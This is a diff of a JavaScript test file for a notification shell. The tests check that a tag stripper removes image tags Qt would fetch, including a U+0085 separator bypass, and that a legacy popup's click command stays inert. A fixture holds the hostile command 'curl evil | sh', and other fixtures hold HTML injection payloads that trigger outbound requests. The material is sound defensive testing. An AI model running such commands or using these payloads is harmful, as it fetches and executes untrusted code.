@@ -23,7 +23,7 @@ assertEqual(
 // would honour as an image survives, so assert that directly. Tags are bounded
 // the conservative way the stripper bounds them: a `<` opens a tag that runs to
 // the next `>`. Qt's own bound can be longer, since a `>` inside a quoted
-// attribute value does not close a tag there — which only ever splits one Qt
+// attribute value does not close a tag there, which only ever splits one Qt
 // tag into several here, so a name this helper reads is a name Qt reads too.
 function survivingTagNames(text) {
   const names = []
@@ -35,7 +35,7 @@ function survivingTagNames(text) {
     const tag = close === -1 ? text.slice(open) : text.slice(open, close + 1)
     // Read the name the way Qt does, skipping anything that is not part of it.
     // Matching the separator with \s instead would give this helper the same
-    // blind spot as the code it is checking — Qt skips U+0085 and \s does not —
+    // blind spot as the code it is checking, Qt skips U+0085 and \s does not, 
     // and an assertion that shares the implementation's bug proves nothing.
     const name = /^<[^A-Za-z0-9]*([A-Za-z0-9]+)/.exec(tag)
     if (name) names.push(name[1].toLowerCase())
@@ -88,7 +88,7 @@ assertNoImageSurvives(
 
 // Qt skips the separator between `<` and the tag name with QChar::isSpace(),
 // which counts U+0085 NEL. JavaScript's \s does not. Reading the name with \s
-// finds none here, keeps the tag, and Qt then reads `img` and fetches it —
+// finds none here, keeps the tag, and Qt then reads `img` and fetches it, 
 // measured against Qt 6.11.2, where this exact body makes a StyledText Text
 // issue an outbound GET. Asserted on the whole output rather than through
 // assertNoImageSurvives so it holds even if that helper is ever loosened.
@@ -106,8 +106,8 @@ assertNoImageSurvives(
 // The card rewrites newlines to <br/> for the StyledText, which puts tag syntax
 // inside a tag the stripper kept: `<x`, newline, `<img …>` is one tag named `x`
 // to both the stripper and Qt, and the rewrite splits it into `<x<br/>` and a
-// live image tag. Measured against Qt 6.11.2 — the rewritten form issues the GET
-// and the original does not — so the strip has to run after the rewrite, which
+// live image tag. Measured against Qt 6.11.2, the rewritten form issues the GET
+// and the original does not, so the strip has to run after the rewrite, which
 // is what styledBody() does.
 assertNoImageSurvives(
   '<x\n<img src="http://host/split.png">',
@@ -301,8 +301,8 @@ assertDeepEqual(
   'notifications create stable snapshots'
 )
 
-// An in-place update keeps the popup's identity — the file name it was
-// persisted under — and takes everything the card draws from the new content.
+// An in-place update keeps the popup's identity, the file name it was
+// persisted under, and takes everything the card draws from the new content.
 const replacement = notifications.replacementSnapshot(
   {
     id: 12,
@@ -584,7 +584,7 @@ assertEqual(
 // Upgrade fail-closed: a popup persisted by a pre-upgrade shell carried its
 // click action as an `exec` shell string. After the update-triggered shell
 // restart the new shell only honors execArgv, so a restored legacy popup keeps
-// displaying but its click is inert — deliberately, because splitting the old
+// displaying but its click is inert, deliberately, because splitting the old
 // shell string back into a command is exactly the injection being removed.
 const legacyRestored = notifications.parsePopupFiles(
   JSON.stringify({ id: 7, originalId: 7, timestamp: 9, summary: 'Legacy toast', exec: 'curl evil | sh' }),
